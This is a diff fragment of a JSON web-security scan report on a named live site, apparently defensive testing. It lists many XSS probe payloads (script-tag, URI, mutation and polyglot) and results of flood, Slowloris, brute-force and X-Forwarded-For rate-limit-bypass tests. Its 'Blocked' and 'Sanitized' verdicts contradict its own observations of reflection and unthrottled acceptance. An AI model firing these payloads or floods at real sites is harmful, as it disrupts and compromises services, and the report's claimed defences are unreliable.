+        "severity": "CRITICAL",
+        "action": "Sanitized",
+        "technique": "Stored XSS Protection",
+        "explanation": "Input sanitised before database storage AND encoded on output. Double-layer protection prevents persistent XSS execution.",
+        "safe_output_example": "alert(&#x27;stored-xss&#x27;)",
+        "triggered_rules": [
+          "Stored Content Sanitization",
+          "Output Encoding",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "input",
+        "method": "GET",
+        "payload": "'\"><script>alert('stored-xss')</script>",
+        "xss_type": "Stored XSS",
+        "severity": "CRITICAL",
+        "action": "Sanitized",
+        "technique": "Stored XSS Protection",
+        "explanation": "Input sanitised before database storage AND encoded on output. Double-layer protection prevents persistent XSS execution.",
+        "safe_output_example": "&#x27;&quot;&gt;alert(&#x27;stored-xss&#x27;)",
+        "triggered_rules": [
+          "Stored Content Sanitization",
+          "Output Encoding",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "input",
+        "method": "GET",
+        "payload": "&#106;avascript:alert(1)",
+        "xss_type": "JavaScript URI XSS",
+        "severity": "HIGH",
+        "action": "Blocked",
+        "technique": "Content Security Policy",
+        "explanation": "CSP header blocked inline script execution. Content-Security-Policy: script-src 'self'; object-src 'none'",
+        "safe_output_example": "[inline script blocked by CSP]",
+        "triggered_rules": [
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "input",
+        "method": "GET",
+        "payload": "vbscript:msgbox(1)",
+        "xss_type": "JavaScript URI XSS",
+        "severity": "HIGH",
+        "action": "Blocked",
+        "technique": "JavaScript URI Blocking",
+        "explanation": "Malicious javascript: / data: URI blocked. Only http:// and https:// protocols are allowed.",
+        "safe_output_example": "[URI blocked: only http/https allowed]",
+        "triggered_rules": [
+          "JavaScript URI Blocking",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "input",
+        "method": "GET",
+        "payload": "data:text/html,<script>alert(1)</script>",
+        "xss_type": "JavaScript URI XSS",
+        "severity": "HIGH",
+        "action": "Blocked",
+        "technique": "JavaScript URI Blocking",
+        "explanation": "Malicious javascript: / data: URI blocked. Only http:// and https:// protocols are allowed.",
+        "safe_output_example": "[URI blocked: only http/https allowed]",
+        "triggered_rules": [
+          "JavaScript URI Blocking",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "input",
+        "method": "GET",
+        "payload": "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">",
+        "xss_type": "Mutation XSS",
+        "severity": "HIGH",
+        "action": "Blocked",
+        "technique": "Polyglot Filter",
+        "explanation": "Layered defence applied to polyglot payload. Sanitisation + encoding + CSP combined for multi-vector protection.",
+        "safe_output_example": "[multi-vector payload filtered by layered defence]",
+        "triggered_rules": [
+          "Polyglot Payload Filter",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "input",
+        "method": "GET",
+        "payload": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+        "xss_type": "Mutation XSS",
+        "severity": "HIGH",
+        "action": "Blocked",
+        "technique": "Polyglot Filter",
+        "explanation": "Layered defence applied to polyglot payload. Sanitisation + encoding + CSP combined for multi-vector protection.",
+        "safe_output_example": "[multi-vector payload filtered by layered defence]",
+        "triggered_rules": [
+          "Polyglot Payload Filter",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "input",
+        "method": "GET",
+        "payload": "<table><caption><p><b><u><s></caption></table><script>alert(1)</script>",
+        "xss_type": "Mutation XSS",
+        "severity": "HIGH",
+        "action": "Blocked",
+        "technique": "Polyglot Filter",
+        "explanation": "Layered defence applied to polyglot payload. Sanitisation + encoding + CSP combined for multi-vector protection.",
+        "safe_output_example": "[multi-vector payload filtered by layered defence]",
+        "triggered_rules": [
+          "Polyglot Payload Filter",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "input",
+        "method": "GET",
+        "payload": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
+        "xss_type": "Polyglot XSS",
+        "severity": "HIGH",
+        "action": "Blocked",
+        "technique": "Polyglot Filter",
+        "explanation": "Layered defence applied to polyglot payload. Sanitisation + encoding + CSP combined for multi-vector protection.",
+        "safe_output_example": "[multi-vector payload filtered by layered defence]",
+        "triggered_rules": [
+          "Polyglot Payload Filter",
+          "Output Encoding",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "input",
+        "method": "GET",
+        "payload": "';alert(1)//';alert(1)//\";alert(1)//\";alert(1)//--></SCRIPT>'><SCRIPT>alert(1)</SCRIPT>",
+        "xss_type": "Polyglot XSS",
+        "severity": "HIGH",
+        "action": "Blocked",
+        "technique": "Polyglot Filter",
+        "explanation": "Layered defence applied to polyglot payload. Sanitisation + encoding + CSP combined for multi-vector protection.",
+        "safe_output_example": "[multi-vector payload filtered by layered defence]",
+        "triggered_rules": [
+          "Polyglot Payload Filter",
+          "Output Encoding",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'SCRIPT' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "search",
+        "method": "GET",
+        "payload": "<script>alert(1)</script>",
+        "xss_type": "Reflected XSS",
+        "severity": "HIGH",
+        "action": "Encoded",
+        "technique": "Output Encoding",
+        "explanation": "HTML special characters encoded before rendering. < \u2192 &lt;  > \u2192 &gt;  \" \u2192 &quot;  & \u2192 &amp;",
+        "safe_output_example": "&lt;script&gt;alert(1)&lt;/script&gt;",
+        "triggered_rules": [
+          "Output Encoding",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "search",
+        "method": "GET",
+        "payload": "<script>alert('XSS')</script>",
+        "xss_type": "Reflected XSS",
+        "severity": "HIGH",
+        "action": "Encoded",
+        "technique": "Output Encoding",
+        "explanation": "HTML special characters encoded before rendering. < \u2192 &lt;  > \u2192 &gt;  \" \u2192 &quot;  & \u2192 &amp;",
+        "safe_output_example": "&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;",
+        "triggered_rules": [
+          "Output Encoding",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "search",
+        "method": "GET",
+        "payload": "<script>alert(document.domain)</script>",
+        "xss_type": "Reflected XSS",
+        "severity": "HIGH",
+        "action": "Encoded",
+        "technique": "Output Encoding",
+        "explanation": "HTML special characters encoded before rendering. < \u2192 &lt;  > \u2192 &gt;  \" \u2192 &quot;  & \u2192 &amp;",
+        "safe_output_example": "&lt;script&gt;alert(document.domain)&lt;/script&gt;",
+        "triggered_rules": [
+          "Output Encoding",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "search",
+        "method": "GET",
+        "payload": "'\"><script>alert(1)</script>",
+        "xss_type": "Reflected XSS",
+        "severity": "HIGH",
+        "action": "Encoded",
+        "technique": "Output Encoding",
+        "explanation": "HTML special characters encoded before rendering. < \u2192 &lt;  > \u2192 &gt;  \" \u2192 &quot;  & \u2192 &amp;",
+        "safe_output_example": "&#x27;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;",
+        "triggered_rules": [
+          "Output Encoding",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "search",
+        "method": "GET",
+        "payload": "</title><script>alert(1)</script>",
+        "xss_type": "Reflected XSS",
+        "severity": "HIGH",
+        "action": "Encoded",
+        "technique": "Output Encoding",
+        "explanation": "HTML special characters encoded before rendering. < \u2192 &lt;  > \u2192 &gt;  \" \u2192 &quot;  & \u2192 &amp;",
+        "safe_output_example": "&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt;",
+        "triggered_rules": [
+          "Output Encoding",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "search",
+        "method": "GET",
+        "payload": "<ScRiPt>alert(1)</ScRiPt>",
+        "xss_type": "Reflected XSS",
+        "severity": "HIGH",
+        "action": "Encoded",
+        "technique": "Output Encoding",
+        "explanation": "HTML special characters encoded before rendering. < \u2192 &lt;  > \u2192 &gt;  \" \u2192 &quot;  & \u2192 &amp;",
+        "safe_output_example": "&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;",
+        "triggered_rules": [
+          "Output Encoding",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'ScRiPt' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "search",
+        "method": "GET",
+        "payload": "<script >alert(1)</script >",
+        "xss_type": "Reflected XSS",
+        "severity": "HIGH",
+        "action": "Encoded",
+        "technique": "Output Encoding",
+        "explanation": "HTML special characters encoded before rendering. < \u2192 &lt;  > \u2192 &gt;  \" \u2192 &quot;  & \u2192 &amp;",
+        "safe_output_example": "&lt;script &gt;alert(1)&lt;/script &gt;",
+        "triggered_rules": [
+          "Output Encoding",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "search",
+        "method": "GET",
+        "payload": "<!--<script>alert(1)--></script>",
+        "xss_type": "Reflected XSS",
+        "severity": "HIGH",
+        "action": "Encoded",
+        "technique": "Output Encoding",
+        "explanation": "HTML special characters encoded before rendering. < \u2192 &lt;  > \u2192 &gt;  \" \u2192 &quot;  & \u2192 &amp;",
+        "safe_output_example": "&lt;!--&lt;script&gt;alert(1)--&gt;&lt;/script&gt;",
+        "triggered_rules": [
+          "Output Encoding",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "search",
+        "method": "GET",
+        "payload": "<script/src=data:,alert(1)></script>",
+        "xss_type": "Reflected XSS",
+        "severity": "HIGH",
+        "action": "Encoded",
+        "technique": "Output Encoding",
+        "explanation": "HTML special characters encoded before rendering. < \u2192 &lt;  > \u2192 &gt;  \" \u2192 &quot;  & \u2192 &amp;",
+        "safe_output_example": "&lt;script/src=data:,alert(1)&gt;&lt;/script&gt;",
+        "triggered_rules": [
+          "Output Encoding",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "search",
+        "method": "GET",
+        "payload": "<script>/**/alert(1)</script>",
+        "xss_type": "Reflected XSS",
+        "severity": "HIGH",
+        "action": "Encoded",
+        "technique": "Output Encoding",
+        "explanation": "HTML special characters encoded before rendering. < \u2192 &lt;  > \u2192 &gt;  \" \u2192 &quot;  & \u2192 &amp;",
+        "safe_output_example": "&lt;script&gt;/**/alert(1)&lt;/script&gt;",
+        "triggered_rules": [
+          "Output Encoding",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "search",
+        "method": "GET",
+        "payload": "<script>alert('stored-xss')</script>",
+        "xss_type": "Stored XSS",
+        "severity": "CRITICAL",
+        "action": "Sanitized",
+        "technique": "Stored XSS Protection",
+        "explanation": "Input sanitised before database storage AND encoded on output. Double-layer protection prevents persistent XSS execution.",
+        "safe_output_example": "alert(&#x27;stored-xss&#x27;)",
+        "triggered_rules": [
+          "Stored Content Sanitization",
+          "Output Encoding",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "search",
+        "method": "GET",
+        "payload": "'\"><script>alert('stored-xss')</script>",
+        "xss_type": "Stored XSS",
+        "severity": "CRITICAL",
+        "action": "Sanitized",
+        "technique": "Stored XSS Protection",
+        "explanation": "Input sanitised before database storage AND encoded on output. Double-layer protection prevents persistent XSS execution.",
+        "safe_output_example": "&#x27;&quot;&gt;alert(&#x27;stored-xss&#x27;)",
+        "triggered_rules": [
+          "Stored Content Sanitization",
+          "Output Encoding",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "search",
+        "method": "GET",
+        "payload": "&#106;avascript:alert(1)",
+        "xss_type": "JavaScript URI XSS",
+        "severity": "HIGH",
+        "action": "Blocked",
+        "technique": "Content Security Policy",
+        "explanation": "CSP header blocked inline script execution. Content-Security-Policy: script-src 'self'; object-src 'none'",
+        "safe_output_example": "[inline script blocked by CSP]",
+        "triggered_rules": [
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "search",
+        "method": "GET",
+        "payload": "vbscript:msgbox(1)",
+        "xss_type": "JavaScript URI XSS",
+        "severity": "HIGH",
+        "action": "Blocked",
+        "technique": "JavaScript URI Blocking",
+        "explanation": "Malicious javascript: / data: URI blocked. Only http:// and https:// protocols are allowed.",
+        "safe_output_example": "[URI blocked: only http/https allowed]",
+        "triggered_rules": [
+          "JavaScript URI Blocking",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "search",
+        "method": "GET",
+        "payload": "data:text/html,<script>alert(1)</script>",
+        "xss_type": "JavaScript URI XSS",
+        "severity": "HIGH",
+        "action": "Blocked",
+        "technique": "JavaScript URI Blocking",
+        "explanation": "Malicious javascript: / data: URI blocked. Only http:// and https:// protocols are allowed.",
+        "safe_output_example": "[URI blocked: only http/https allowed]",
+        "triggered_rules": [
+          "JavaScript URI Blocking",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "search",
+        "method": "GET",
+        "payload": "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">",
+        "xss_type": "Mutation XSS",
+        "severity": "HIGH",
+        "action": "Blocked",
+        "technique": "Polyglot Filter",
+        "explanation": "Layered defence applied to polyglot payload. Sanitisation + encoding + CSP combined for multi-vector protection.",
+        "safe_output_example": "[multi-vector payload filtered by layered defence]",
+        "triggered_rules": [
+          "Polyglot Payload Filter",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "search",
+        "method": "GET",
+        "payload": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+        "xss_type": "Mutation XSS",
+        "severity": "HIGH",
+        "action": "Blocked",
+        "technique": "Polyglot Filter",
+        "explanation": "Layered defence applied to polyglot payload. Sanitisation + encoding + CSP combined for multi-vector protection.",
+        "safe_output_example": "[multi-vector payload filtered by layered defence]",
+        "triggered_rules": [
+          "Polyglot Payload Filter",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "search",
+        "method": "GET",
+        "payload": "<table><caption><p><b><u><s></caption></table><script>alert(1)</script>",
+        "xss_type": "Mutation XSS",
+        "severity": "HIGH",
+        "action": "Blocked",
+        "technique": "Polyglot Filter",
+        "explanation": "Layered defence applied to polyglot payload. Sanitisation + encoding + CSP combined for multi-vector protection.",
+        "safe_output_example": "[multi-vector payload filtered by layered defence]",
+        "triggered_rules": [
+          "Polyglot Payload Filter",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "search",
+        "method": "GET",
+        "payload": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
+        "xss_type": "Polyglot XSS",
+        "severity": "HIGH",
+        "action": "Blocked",
+        "technique": "Polyglot Filter",
+        "explanation": "Layered defence applied to polyglot payload. Sanitisation + encoding + CSP combined for multi-vector protection.",
+        "safe_output_example": "[multi-vector payload filtered by layered defence]",
+        "triggered_rules": [
+          "Polyglot Payload Filter",
+          "Output Encoding",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'script' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      },
+      {
+        "endpoint": "/",
+        "parameter": "search",
+        "method": "GET",
+        "payload": "';alert(1)//';alert(1)//\";alert(1)//\";alert(1)//--></SCRIPT>'><SCRIPT>alert(1)</SCRIPT>",
+        "xss_type": "Polyglot XSS",
+        "severity": "HIGH",
+        "action": "Blocked",
+        "technique": "Polyglot Filter",
+        "explanation": "Layered defence applied to polyglot payload. Sanitisation + encoding + CSP combined for multi-vector protection.",
+        "safe_output_example": "[multi-vector payload filtered by layered defence]",
+        "triggered_rules": [
+          "Polyglot Payload Filter",
+          "Output Encoding",
+          "HTML Input Sanitization",
+          "Content Security Policy Enforcement"
+        ],
+        "evidence": "Partial payload reflection detected: 'SCRIPT' reflected at: ...nIQ</title>\n    <meta name=\"description\" content=\"Measure. Manage....",
+        "confidence": "PROBABLE"
+      }
+    ]
+  },
+  "ddos_defense_simulation": {
+    "summary": {
+      "total_evaluated": 11,
+      "total_mitigated": 9,
+      "total_allowed": 2,
+      "defense_rate": 81.8,
+      "by_technique": {
+        "IP Blocking": 3,
+        "Connection Limiting": 1,
+        "Request Size Validation": 1,
+        "Traffic Throttling": 2,
+        "Rate Limit Bypass Detection": 2
+      },
+      "by_attack_type": {
+        "HTTP Flood": 1,
+        "Slowloris": 1,
+        "Large Payload": 1,
+        "Login Brute Force Flood": 2,
+        "Resource Exhaustion via File Upload": 2,
+        "Cache Bypass Flood": 2,
+        "Rate Limit Bypass": 2
+      },
+      "by_action": {
+        "Blocked": 5,
+        "Connection Limited": 1,
+        "Rejected": 1,
+        "Allowed": 2,
+        "Throttled": 2
+      },
+      "target_url": "https://carbon-iq-live.vercel.app",
+      "attack_breakdown": {
+        "HTTP Flood": 1,
+        "Slowloris": 1,
+        "Large Payload": 1,
+        "Login Brute Force Flood": 2,
+        "Resource Exhaustion via File Upload": 2,
+        "Cache Bypass Flood": 2,
+        "Rate Limit Bypass": 2
+      },
+      "analysis_time_ms": 0.3
+    },
+    "verdicts": [
+      {
+        "attack_type": "HTTP Flood",
+        "severity": "HIGH",
+        "endpoint": "/",
+        "observation": "Server accepted 200 requests within 0.8s without throttling. Avg response: 77ms, baseline: 38ms, errors: 0/200.",
+        "recommendation": "Implement request rate limiting or WAF protection.",
+        "details": {
+          "total_requests": 200,
+          "concurrency": 20,
+          "avg_response_ms": 77.3,
+          "max_response_ms": 777.7,
+          "baseline_ms": 38.2,
+          "errors": 0
+        },
+        "action": "Blocked",
+        "technique": "IP Blocking",
+        "explanation": "Repeated malicious behaviour detected from source IP. IP temporarily blocked for 15 minutes.",
+        "triggered_rules": [
+          "IP Blocking",
+          "Request Rate Limiting",
+          "Traffic Throttling"
+        ]
+      },
+      {
+        "attack_type": "Slowloris",
+        "severity": "HIGH",
+        "endpoint": "/",
+        "observation": "Server accepted 40/40 partial HTTP connections without enforcing connection timeouts. 40 connections remained alive after slow header injection.",
+        "recommendation": "Implement connection timeouts, limit concurrent connections per IP, or deploy a reverse proxy with Slowloris protection.",
+        "details": {
+          "connections_attempted": 40,
+          "connections_accepted": 40,
+          "connections_surviving": 40
+        },
+        "action": "Connection Limited",
+        "technique": "Connection Limiting",
+        "explanation": "Excessive open connections detected. Concurrent connection limit enforced: max 10 per IP, idle timeout 30s.",
+        "triggered_rules": [
+          "Connection Limiting"
+        ]
+      },
+      {
+        "attack_type": "Large Payload",
+        "severity": "HIGH",
+        "endpoint": "/",
+        "observation": "Server accepted a 10MB POST payload (status 405) without enforcing size limits.",
+        "recommendation": "Enforce request body size limits (e.g., 1\u20135MB max) at the web server or reverse proxy level.",
+        "details": {
+          "payload_size_mb": 10,
+          "status_code": 405
+        },
+        "action": "Rejected",
+        "technique": "Request Size Validation",
+        "explanation": "Abnormally large request payload detected. Requests exceeding 10MB rejected (HTTP 413).",
+        "triggered_rules": [
+          "Request Size Validation"
+        ]
+      },
+      {
+        "attack_type": "Login Brute Force Flood",
+        "severity": "HIGH",
+        "endpoint": "/",
+        "observation": "Server accepted 100/100 login attempts without rate limiting or account lockout. Only 0 were blocked.",
+        "recommendation": "Implement login rate limiting, account lockout after failed attempts, CAPTCHA after repeated failures, and IP-based throttling.",
+        "details": {
+          "total_attempts": 100,
+          "successful_attempts": 100,
+          "blocked_attempts": 0
+        },
+        "action": "Blocked",
+        "technique": "IP Blocking",
+        "explanation": "Repeated malicious behaviour detected from source IP. IP temporarily blocked for 15 minutes.",
+        "triggered_rules": [
+          "IP Blocking",
+          "Login Brute Force Protection"
+        ]
+      },
+      {
+        "attack_type": "Login Brute Force Flood",
+        "severity": "HIGH",
+        "endpoint": "/",
+        "observation": "Server accepted 100/100 login attempts without rate limiting or account lockout. Only 0 were blocked.",
+        "recommendation": "Implement login rate limiting, account lockout after failed attempts, CAPTCHA after repeated failures, and IP-based throttling.",
+        "details": {
+          "total_attempts": 100,
+          "successful_attempts": 100,
+          "blocked_attempts": 0
+        },
+        "action": "Blocked",
+        "technique": "IP Blocking",
+        "explanation": "Repeated malicious behaviour detected from source IP. IP temporarily blocked for 15 minutes.",
+        "triggered_rules": [
+          "IP Blocking",
+          "Login Brute Force Protection"
+        ]
+      },
+      {
+        "attack_type": "Resource Exhaustion via File Upload",
+        "severity": "CRITICAL",
+        "endpoint": "/",
+        "observation": "Server accepted 30/30 file uploads without enforcing upload frequency or size restrictions.",
+        "recommendation": "Enforce upload rate limits, maximum file size, disk quota per user, and file type validation.",
+        "details": {
+          "total_uploads": 30,
+          "accepted": 30,
+          "rejected": 0
+        },
+        "action": "Allowed",
+        "technique": null,
+        "explanation": "No matching defense rule. Manual review recommended.",
+        "triggered_rules": []
+      },
+      {
+        "attack_type": "Resource Exhaustion via File Upload",
+        "severity": "CRITICAL",
+        "endpoint": "/",
+        "observation": "Server accepted 30/30 file uploads without enforcing upload frequency or size restrictions.",
+        "recommendation": "Enforce upload rate limits, maximum file size, disk quota per user, and file type validation.",
+        "details": {
+          "total_uploads": 30,
+          "accepted": 30,
+          "rejected": 0
+        },
+        "action": "Allowed",
+        "technique": null,
+        "explanation": "No matching defense rule. Manual review recommended.",
+        "triggered_rules": []
+      },
+      {
+        "attack_type": "Cache Bypass Flood",
+        "severity": "MEDIUM",
+        "endpoint": "/",
+        "observation": "Server recomputes responses for cache-busted requests. Avg cached: 36ms, avg busted: 62ms (difference: 26ms). An attacker could send requests with random parameters to bypass caching.",
+        "recommendation": "Implement cache key normalization to ignore unknown query parameters, or use a CDN with aggressive caching rules.",
+        "details": {
+          "avg_cached_ms": 36.0,
+          "avg_busted_ms": 62.3
+        },
+        "action": "Throttled",
+        "technique": "Traffic Throttling",
+        "explanation": "Traffic spike detected (3.0x above baseline). Request processing delayed by 500ms to protect the server.",
+        "triggered_rules": [
+          "Traffic Throttling",
+          "Caching Protection"
+        ]
+      },
+      {
+        "attack_type": "Cache Bypass Flood",
+        "severity": "MEDIUM",
+        "endpoint": "/",
+        "observation": "Server recomputes responses for cache-busted requests. Avg cached: 44ms, avg busted: 64ms (difference: 20ms). An attacker could send requests with random parameters to bypass caching.",
+        "recommendation": "Implement cache key normalization to ignore unknown query parameters, or use a CDN with aggressive caching rules.",
+        "details": {
+          "avg_cached_ms": 43.6,
+          "avg_busted_ms": 64.0
+        },
+        "action": "Throttled",
+        "technique": "Traffic Throttling",
+        "explanation": "Traffic spike detected (3.0x above baseline). Request processing delayed by 500ms to protect the server.",
+        "triggered_rules": [
+          "Traffic Throttling",
+          "Caching Protection"
+        ]
+      },
+      {
+        "attack_type": "Rate Limit Bypass",
+        "severity": "CRITICAL",
+        "endpoint": "/",
+        "observation": "Rate limiting was bypassed using spoofed X-Forwarded-For headers. 50/50 requests succeeded.",
+        "recommendation": "Do not trust client-supplied headers (X-Forwarded-For) for rate limiting. Use the actual connection IP from the socket layer, or a trusted proxy header configured at the infrastructure level.",
+        "details": {
+          "bypass_header": "X-Forwarded-For",
+          "successful_requests": 50,
+          "total_requests": 50
+        },
+        "action": "Blocked",
+        "technique": "Rate Limit Bypass Detection",
+        "explanation": "Rate limit evasion attempt detected (rotating headers/user-agents). Adaptive fingerprint-based rate limiting engaged.",
+        "triggered_rules": [
+          "Adaptive Rate Limit Bypass Detection",
+          "IP Blocking"
+        ]
+      },
+      {
+        "attack_type": "Rate Limit Bypass",
+        "severity": "CRITICAL",
+        "endpoint": "/",
+        "observation": "Rate limiting was bypassed using spoofed X-Forwarded-For headers. 50/50 requests succeeded.",
+        "recommendation": "Do not trust client-supplied headers (X-Forwarded-For) for rate limiting. Use the actual connection IP from the socket layer, or a trusted proxy header configured at the infrastructure level.",
+        "details": {
+          "bypass_header": "X-Forwarded-For",
+          "successful_requests": 50,
+          "total_requests": 50
+        },
+        "action": "Blocked",
+        "technique": "Rate Limit Bypass Detection",
+        "explanation": "Rate limit evasion attempt detected (rotating headers/user-agents). Adaptive fingerprint-based rate limiting engaged.",
+        "triggered_rules": [
+          "Adaptive Rate Limit Bypass Detection",
+          "IP Blocking"
+        ]
+      }
+    ]
+  },
+  "static_analysis_findings": [],
